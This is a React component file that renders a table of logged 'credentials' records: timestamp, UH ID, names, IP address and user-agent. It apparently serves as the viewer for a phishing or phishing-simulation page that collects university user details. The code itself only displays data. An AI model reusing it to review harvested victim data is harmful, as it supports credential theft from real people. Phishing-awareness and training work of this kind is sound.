import React from 'react';
import {
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Paper,
} from '@mui/material';
import { Credential } from '../types/types';

interface Props {
  credentials: Credential[];
}

export const CredentialsTable: React.FC<Props> = ({ credentials }) => {
  return (
    <TableContainer component={Paper}>
      <Table>
        <TableHead>
          <TableRow sx={{ bgcolor: '#c8102e' }}>
            <TableCell sx={{ color: 'white' }}>Timestamp</TableCell>
            <TableCell sx={{ color: 'white' }}>UH ID</TableCell>
            <TableCell sx={{ color: 'white' }}>First Name</TableCell>
            <TableCell sx={{ color: 'white' }}>Last Name</TableCell>
            <TableCell sx={{ color: 'white' }}>IP Address</TableCell>
            <TableCell sx={{ color: 'white' }}>User-Agent</TableCell>
          </TableRow>
        </TableHead>
        <TableBody>
          {credentials.map((cred, index) => (
            <TableRow key={index} sx={{ '&:nth-of-type(even)': { bgcolor: '#f2f2f2' } }}>
              <TableCell>{new Date(cred.timestamp).toLocaleString()}</TableCell>
              <TableCell>{cred.uh_id}</TableCell>
              <TableCell>{cred.first_name}</TableCell>
              <TableCell>{cred.last_name}</TableCell>
              <TableCell>{cred.ip}</TableCell>
              <TableCell sx={{ maxWidth: 300, overflowWrap: 'break-word' }}>{cred.ua}</TableCell>
            </TableRow>
          ))}
        </TableBody>
      </Table>
    </TableContainer>
  );
}; 